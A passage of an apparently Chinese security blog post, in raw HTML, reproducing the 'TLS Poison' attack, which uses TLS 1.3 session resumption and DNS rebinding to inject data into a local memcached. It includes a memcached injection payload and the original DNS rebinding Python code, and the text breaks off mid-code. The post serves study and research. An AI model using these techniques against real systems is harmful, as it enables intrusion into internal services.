ILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/1.png" alt></p><p>&#x5176;&#x4E2D;&#x53EF;&#x80FD;&#x4F1A;&#x4EA7;&#x751F;&#x51E0;&#x79CD;&#x7ED3;&#x679C;</p><ul><li>&#x7B2C;&#x4E00;&#x79CD;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x7ED3;&#x679C;&#x5C31;&#x662F;<code>curl: (47) Maximum (50) redirects followed</code>&#xFF0C;&#x8868;&#x793A;&#x91CD;&#x5B9A;&#x5411;&#x6B21;&#x6570;&#x5DF2;&#x7ECF;&#x8D85;&#x8FC7;&#x4E86; curl &#x9ED8;&#x8BA4;&#x7684;&#x6700;&#x5927;&#x6DF1;&#x5EA6; 50 &#x6B21;&#xFF0C;&#x8BF4;&#x660E; DNS Rebinding &#x6CA1;&#x6709;&#x5C06; 127.0.0.1 &#x8FD4;&#x56DE;&#x5230;&#x7ED9; Client &#xFF0C;&#x8FD9;&#x91CC;&#x56E0;&#x7D20;&#x4E5F;&#x6BD4;&#x8F83;&#x591A;&#xFF0C;&#x540E;&#x6587;&#x4F1A;&#x63D0;&#x5230;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;&#x8FD0;&#x6C14;&#x6BD4;&#x8F83;&#x5DEE;&#xFF0C;&#x591A;&#x8BD5;&#x51E0;&#x6B21;&#x5C31;&#x884C;&#x4E86;&#x3002;</li><li>&#x7B2C;&#x4E8C;&#x79CD;&#x7ED3;&#x679C;&#x662F;<code>curl: (35) error:1408F10B:SSL routines:ssl3_get_record:wrong version number</code>&#xFF0C;&#x5982;&#x679C;&#x4E0A;&#x9762;&#x7684;&#x4FE1;&#x606F;&#x4F60;&#x8FD8;&#x770B;&#x5230;&#x4E86;<code>Trying 127.0.0.1</code>&#xFF0C;&#x90A3;&#x4E48;&#x606D;&#x559C;&#x4F60;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x8FD9;&#x6B21;&#x5C31;&#x6210;&#x529F;&#x4E86;&#xFF0C;&#x8D76;&#x7D27;&#x53BB; memcached &#x770B;&#x770B;&#x5427;</li></ul><h3 id="The-Details-OF-Original-Method"><a href="#The-Details-OF-Original-Method" class="headerlink" title="The Details OF Original Method"></a>The Details OF Original Method</h3><p>&#x5728;&#x6574;&#x7406;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x4E4B;&#x524D;&#xFF0C;&#x6211;&#x4E5F;&#x53C2;&#x8003;&#x4E86;&#x5F88;&#x591A;&#x6587;&#x7AE0;&#xFF0C;&#x867D;&#x7136;&#x8FD9;&#x4E9B;&#x6587;&#x7AE0;&#x6CA1;&#x6709;&#x660E;&#x786E;&#x7684;&#x8BF4;&#x660E;&#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#x7684;&#x653B;&#x51FB;&#x8F7D;&#x4F53;&#xFF0C;&#x4E5F;&#x5C31;&#x662F; Payload &#x6700;&#x5927;&#x957F;&#x5EA6;&#x662F; 32 &#x5B57;&#x8282;&#xFF0C;&#x4F46;&#x662F;&#x90FD;&#x7ED9;&#x4E86;&#x8BA9;&#x6211;&#x4EA7;&#x751F;&#x4E86;&#x4E00;&#x79CD;&#x5148;&#x5165;&#x4E3A;&#x4E3B;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x5728;&#x6211;&#x5370;&#x8C61;&#x5F53;&#x4E2D;&#x5B83;&#x5C31;&#x53EA;&#x5C40;&#x9650;&#x4E8E; 32 &#x5B57;&#x8282;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x53BB;&#x8BE6;&#x7EC6;&#x53BB;&#x770B;&#x4F5C;&#x8005;&#x516C;&#x5F00;&#x7684; PDF &#x65F6;&#xFF0C;&#x53D1;&#x73B0;&#x4F5C;&#x8005;&#x5728;&#x6F14;&#x793A;&#x653B;&#x51FB; SMTP &#x65F6;&#x6709;&#x4E00;&#x4E2A;&#x56FE;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/2.jpg" alt></p><p>&#x5176;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x4E2A; payload &#x5DF2;&#x7ECF;&#x8FDC;&#x8FDC;&#x8D85;&#x8FC7;&#x4E86; 32 &#x5B57;&#x8282;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x62B1;&#x7740;&#x7591;&#x60D1;&#x53BB;&#x53CD;&#x590D;&#x67E5;&#x770B;&#x4F5C;&#x8005;&#x516C;&#x5E03;&#x7684;&#x6F14;&#x8BB2;&#x5F55;&#x50CF;&#xFF0C;&#x5176;&#x4E2D;&#x4ED6;&#x6709;&#x8FD9;&#x4E48;&#x8BF4;&#x5230;&#xFF08;&#x4F46;&#x613F;&#x6211;&#x7684;&#x82F1;&#x8BED;&#x542C;&#x529B;&#x4EE5;&#x53CA; Youtube &#x5B57;&#x5E55;&#x8DB3;&#x591F;&#x51C6;&#x786E;&#xFF09;&#xFF1A;</p><blockquote><p>&#x200B;    It might seem too good to be ture but TLS actually provides us exactly that in the form of a session id. Most clients even persist this field for later use. Session ids are limited to 32 bytes as you can see but depending on the implementation you might have session ticket. This one is about 200 bytes but these can be up to around 65 kilobytes. But session ids and session tickets are mechanisms for a TLS client to go. Remember that cryptographic key exchange we did earlier let&#x2019;s just keep using that key in this new connection. TLS 1.3 includes a slightly more complicated but similar mechanism called a pre-shared key identity which pretty much does the smae thing for our purposes. All of these are about optimization since key exchange can be time consuming. But they provide a certain way for a server to tell whatever is connecting to it to persist some data for lighter use, almost like a cookie that lives in plain text. So it&#x2019;s perfect for the surf attack we&#x2019;re trying to do.</p></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x8FD9;&#x4E2A;&#x653B;&#x51FB;&#x672C;&#x6765;&#x5C31;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x8D85;&#x8FC7; 32 &#x5B57;&#x8282;&#x7684;&#x505A;&#x6CD5;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x6240;&#x8BF4;&#x7684;&#x90A3;&#x51E0;&#x79CD; Session Resumption &#xFF0C;&#x53EA;&#x6709; SessionID &#x5C40;&#x9650;&#x4E8E; 32 &#x5B57;&#x8282;&#x4EE5;&#x4E0B;&#x3002;</p><p>&#x5E76;&#x4E14;&#x6309;&#x7167;&#x4E0A;&#x9762;&#x6211;&#x4EEC;&#x7684;&#x5B9E;&#x9A8C;&#x7ED3;&#x679C;&#x5176;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x6309;&#x7167;&#x539F;&#x6765;&#x4F5C;&#x8005;&#x5728;&#x5176;&#x4ED3;&#x5E93; README &#x63CF;&#x8FF0;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE;&#x5B9E;&#x8DF5;&#x4E2D;&#x770B;&#x51FA;&#x5982;&#x4E0B;&#x51E0;&#x4E2A;&#x70B9;&#xFF1A;</p><ul><li>&#x53CC;&#x65B9;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528; TLS 1.3 &#x8FDB;&#x884C;&#x63E1;&#x624B;&#x6570;&#x636E;&#x4EA4;&#x4E92;&#xFF0C;&#x5F53;&#x7136;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x4F60;&#x7684; curl &#x652F;&#x6301; TLS 1.3 </li><li>TLS 1.3 &#x4F7F;&#x7528; PSK &#x8FDB;&#x884C; Session Resumption</li><li>PSK &#x540E;&#x9762;&#x8FD8;&#x5305;&#x542B;&#x4E86;&#x5F88;&#x591A;&#x4E2A; 0x00 &#xFF0C;&#x603B;&#x957F;&#x5EA6;&#x8FDC;&#x8FDC;&#x8D85;&#x8FC7;&#x4E86; 32 &#x5B57;&#x8282;</li></ul><p>&#x6240;&#x4EE5;&#x4F5C;&#x8005;&#x539F;&#x4ED3;&#x5E93;&#x5B9E;&#x73B0;&#x7684;&#x662F;&#x57FA;&#x4E8E; TLS 1.3 &#x7684; Session Resumption &#xFF0C;&#x540E;&#x9762;&#x6211;&#x4EEC;&#x5177;&#x4F53;&#x770B;&#x5176;&#x5B9E;&#x73B0;&#x4EE3;&#x7801;&#x53D1;&#x73B0;&#x4E5F;&#x786E;&#x662F;&#x5982;&#x6B64;&#xFF0C;&#x4F5C;&#x8005;&#x53EA;&#x5B9E;&#x73B0;&#x4E86;&#x57FA;&#x4E8E; PSK &#x7684;&#x4F1A;&#x8BDD;&#x6062;&#x590D; SSRF &#xFF0C;&#x5176;&#x4ED6;&#x51E0;&#x7C7B;&#x90FD;&#x6CA1;&#x6709;&#x5B9E;&#x73B0;&#x3002;</p><p>&#x6240;&#x4EE5;&#xFF0C;&#x611F;&#x89C9;&#x4E00;&#x5207;&#x90FD;&#x6709;&#x4E9B;&#x660E;&#x6717;&#x4E86;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x518D;&#x6765;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#x8D85;&#x8D8A; 32 &#x5B57;&#x8282;&#x7684; payload &#xFF0C;&#x770B;&#x770B;&#x5230;&#x5E95;&#x80FD;&#x4E0D;&#x80FD;&#x5B9E;&#x73B0;&#x3002;&#x4F9D;&#x65E7;&#x6309;&#x7167;&#x5982;&#x4E0A;&#x7684;&#x6D41;&#x7A0B;&#x505A;&#x597D; setup &#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x4E0D;&#x540C;&#x7684;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5728; TLS VPS &#x7684; redis &#x4E0A;&#x4FEE;&#x6539;&#x4E00;&#x4E0B; payload &#xFF0C;&#x8FD9;&#x6B21;&#x6211;&#x4EEC;&#x968F;&#x610F;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;&#xFF0C;&#x53EA;&#x8981;&#x591F;&#x957F;&#x5C31;&#x597D;&#xFF0C;&#x8FD9;&#x91CC;&#x4E00;&#x5B9A;&#x8981;&#x6CE8;&#x610F;&#x628A;&#x8981;&#x53D1;&#x7ED9; memcached &#x7684; payload &#x5F53;&#x4E2D;&#x7684;<code>set</code>&#x6307;&#x4EE4;&#x7684;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x4FEE;&#x6539;&#x6210;&#x5176; value &#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x4FEE;&#x6539; payload &#x4E3A;&#xFF1A;<code>set payload &quot;\r\nset foo 0 0 79\nThis time I&apos;m really in your cache and I can write what I want into your cache.\r\n&quot;</code>&#x3002;&#xFF08;&#x5F53;&#x7136;&#x8FD8;&#x662F;&#x5EFA;&#x8BAE;&#x5728;&#x5B9E;&#x9A8C;&#x4E4B;&#x524D;&#x4F7F;&#x7528;&#x4E4B;&#x524D;&#x7684;&#x65B9;&#x6CD5;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x81EA;&#x5DF1;&#x7684; payload &#x80FD;&#x5426;&#x5199;&#x5165;&#x5230; memcached &#x5F53;&#x4E2D;&#xFF09;</p><p>Ok. Here we go.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/3.png" alt></p><p>&#x5F53;&#x5F53;&#xFF0C;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x5199;&#x5165;&#x8D85;&#x8FC7; 32 &#x5B57;&#x8282;&#x7684;&#x6570;&#x636E;&#x5566;&#xFF01;</p><h3 id="The-Bad-Code-IN-Original-Method"><a href="#The-Bad-Code-IN-Original-Method" class="headerlink" title="The Bad Code IN Original Method"></a>The Bad Code IN Original Method</h3><p>&#x7ECF;&#x8FC7;&#x4E0A;&#x8FF0;&#x4E24;&#x4E2A;&#x5B9E;&#x9A8C;&#xFF0C;&#x6211;&#x5DF2;&#x7ECF;&#x731C;&#x5230;&#x53EF;&#x80FD;&#x5927;&#x591A;&#x6570;&#x540C;&#x5B66;&#x7684;&#x5B9E;&#x9A8C;&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x6B21;&#x90FD;&#x6210;&#x529F;&#xFF0C;&#x5F88;&#x591A;&#x4EBA;&#x53EF;&#x80FD;&#x90FD;&#x662F;&#x5F97;&#x5230;&#x7B2C;&#x4E00;&#x79CD;&#x7ED3;&#x679C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8D85;&#x8FC7;&#x4E86; curl &#x6700;&#x591A;&#x91CD;&#x5B9A;&#x5411;&#x6B21;&#x6570;&#x800C;&#x5931;&#x8D25;&#xFF0C;&#x800C;&#x5BFC;&#x81F4;&#x8FD9;&#x4E2A;&#x7ED3;&#x679C;&#x7684;&#x539F;&#x56E0;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x5C31;&#x662F; DNS Rebinding &#x5931;&#x8D25;&#xFF0C;&#x6CA1;&#x6709;&#x5728;&#x7B2C;&#x4E8C;&#x6B21; DNS &#x67E5;&#x8BE2;&#x7684;&#x65F6;&#x5019;&#x8FD4;&#x56DE; 127.0.0.1 &#xFF0C;&#x8FD9;&#x6837;&#x4E00;&#x76F4;&#x5728;&#x4E0E; TLSServer &#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x5BFC;&#x81F4;&#x6700;&#x540E;&#x91CD;&#x5B9A;&#x5411;&#x6B21;&#x6570;&#x8FC7;&#x591A;&#x800C;&#x5931;&#x8D25;&#x3002;</p><p>&#x8BA9;&#x6211;&#x4EEC;&#x7B80;&#x5355;&#x770B;&#x770B;&#x4F5C;&#x8005;&#x7684; DNS Rebinding &#x600E;&#x4E48;&#x5199;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x91CD;&#x70B9;&#x5173;&#x6CE8;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">spoof_count = <span class="hljs-number">0</span></span><br><span class="line">start = time()</span><br><span class="line">last_ip = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_spoofed_IP</span><span class="hljs-params">(domain, ip)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> spoof_count</span><br><span class="line">    <span class="hljs-keyword">global</span> start</span><br><span class="line">    <span class="hljs-keyword">global</span> last_ip</span><br><span class="line">    start = time()</span><br><span class="line">    last_ip = ip</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> HOSTS_LIST:</span><br><span class="line">        <span class="hljs-keyword">if</span> re.match(d[<span class="hljs-number">0</span>], domain.lower()) <span class="hljs-keyword">or</span> <span class="hljs-literal">True</span>:</span><br><span class="line">            spoof_count = (spoof_count + <span class="hljs-number">1</span>) % <span class="hljs-number">3</span></span><br><span class="line">            <span class="hljs-comment"># The below line will result in the answer switching after 30 seconds,</span></span><br><span class="line">            <span class="hljs-comment"># instead of alternating</span></span><br><span class="line">            <span class="hljs-comment"># return d[1] if (time() - start &gt; 30) else args.TARGET</span></span><br><span class="line">            <span class="hljs-keyword">return</span> d[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> spoof_count == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> args.TARGET</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x8FD9;&#x662F;&#x4F5C;&#x8005;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x4EE3;&#x7801;</strong>&#xFF0C;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x7684;&#x610F;&#x601D;&#x5927;&#x6982;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x8BB0;&#x5F55; DNS &#x67E5;&#x8BE2;&#x7684;&#x603B;&#x6B21;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x603B;&#x6B21;&#x6570;&#x6A21; 3 &#x4E3A; 0 &#x7684;&#x8BDD;&#xFF0C;&#x4E5F;&#x5C31;&#x662F; 3 &#x7684;&#x500D;&#x6570;&#xFF0C;&#x8FD4;&#x56DE;<code>d[1]</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F; 127.0.0.1 &#xFF0C;&#x5426;&#x5219;&#x5C31;&#x8FD4;&#x56DE;&#x6211;&#x4EEC;&#x7684; TLS VPS IP &#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6211;&#x4EEC;&#x6682;&#x4E14;&#x4E0D;&#x8C08;&#xFF0C;&#x5148;&#x4E0D;&#x5173;&#x6CE8;&#x3002;</p><p>&#x6211;&#x4EEC;&#x518D;&#x6765;&#x770B;&#x770B;&#x5176;&#x6CE8;&#x91CA;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6CE8;&#x91CA;&#x5F53;&#x4E2D;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;DNS Server &#x542F;&#x52A8; 30s &#x4E4B;&#x524D;&#x8FD4;&#x56DE; TLS VPS IP &#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5728; 30s &#x4E4B;&#x540E;&#xFF0C; DNS &#x5C31;&#x4F1A;&#x4E00;&#x76F4;&#x8FD4;&#x56DE;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#x5730;&#x5740; 127.0.0.1 &#x3002;</p><p>&#x6211;&#x4EEC;&#x73B0;&#x5728;&#x5148;&#x63A5;&#x53D7;&#x4E00;&#x4E2A;&#x7ED3;&#x8BBA;&#xFF0C;&#x5C31;&#x662F; curl &#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#x6709;&#x4E00;&#x5B9A;&#x7684; DNS &#x7F13;&#x5B58;&#x65F6;&#x95F4;&#xFF0C;&#x90A3;&#x4E48;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x60F3;&#x8BA9; curl &#x7B2C;&#x4E00;&#x6B21; DNS &#x67E5;&#x8BE2;&#x5F97;&#x5230; TLS VPS IP &#xFF0C;&#x5728;&#x7F13;&#x5B58;&#x65F6;&#x95F4;&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x8FD4;&#x56DE; 127.0.0.1 &#xFF0C;&#x90A3;&#x4E48;&#x6CE8;&#x91CA;&#x5F53;&#x4E2D;&#x7684;&#x65B9;&#x5F0F;&#x662F;&#x6700;&#x597D;&#x4E0D;&#x8FC7;&#x7684;&#x4E86;&#x3002;</p><p>&#x597D;&#x4E86;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F;&#x516C;&#x5F00;&#x5904;&#x5211;&#xFF08;&#x6211;&#x4E5F;&#x4E0D;&#x77E5;&#x9053;&#x4F5C;&#x8005;&#x662F;&#x4E0D;&#x662F;&#x7C97;&#x5FC3;&#x5927;&#x610F;&#x5199;&#x51FA;&#x8FD9;&#x6837;&#x7684;&#x4EE3;&#x7801;&#xFF09;&#xFF1A;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">spoof_count = <span class="hljs-number">0</span></span><br><span class="line">start = time()</span><br><span class="line">last_ip = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_spoofed_IP</span><span class="hljs-params">(domain, ip)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> spoof_count</span><br><span class="line">    <span class="hljs-keyword">global</span> start</span><br><span class="line">    <span class="hljs-keyword">global</span> last_ip</span><br><span class="line">    start = time()</span><br><span class="line">    last_ip = ip</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> HOSTS_LIST:</span><br><span class="line">        <span class="hljs-keyword">if</span> re.match(d[<span class="hljs-number">0</span>], domain.lower()) <span class="hljs-keyword">or</span> <span class="hljs-literal">True</span>:</span><br><span class="line">            spoof_count = (spoof_count + <span class="hljs-number">1</span>) % <span 